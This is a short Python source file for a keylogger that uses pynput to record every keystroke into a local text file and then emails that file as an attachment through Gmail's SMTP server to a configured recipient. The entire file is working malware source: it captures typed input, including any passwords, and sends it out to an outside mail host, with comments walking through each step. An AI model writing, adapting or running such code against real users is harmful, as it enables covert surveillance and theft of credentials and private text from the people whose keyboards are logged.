from pynput.keyboard import Key,Listener # importing the Listener so that we can track the keystroke.

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Keyboard Listening parts starts from here.

def writeToFile(key):#whenever a key is pressed on a keyboard it is going to call the on_press area and this on_press is going to call this 'writetoFile' function and this function will send a key and that key is the key you have entered in your keyboard
  keydata=str(key)
  keydata1=keydata.replace("'","")

  if keydata1 == 'Key.space':
      keydata1=" "
  if keydata1 == 'Key.shift_r' or keydata1 == 'Key.ctrl_l' or keydata1 == 'Key.enter'or keydata1 == 'Key.backspace' or keydata1 == 'Key.shift' or keydata1 == 'Key.esc' or keydata1 == 'Key.left' or keydata1 == 'Key.right' or keydata1 == 'Key.up' or keydata1 == 'Key.down'or keydata1 == 'Key.f5'or keydata1 == 'Key.caps_lock':
      keydata1 = ""
  #print(keydata1)
  with open('log6.txt','a') as f:
      f.write(keydata1)


def stop_logger(key): # For stopping the keylogger.
   if key == Key.esc:
       return False

with Listener(on_press=writeToFile,on_release=stop_logger) as l:#Saving the instance of Listener as l
  l.join() # For joining the keystroke together
# Keyboard Listening parts ends here.
# Mail sending part starts from here
fromaddr =""
toaddr =""
password="password of sender_email_Id"
msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Details of your Logger"

body = "Please see the attachment below"

msg.attach(MIMEText(body, 'plain'))

filename = "log6.txt"
attachment = open("log6.txt", "rb")
part = MIMEBase('application', 'octet-stream')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr,password) #Sender email Id and Password
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()

# Mail sending part ends here
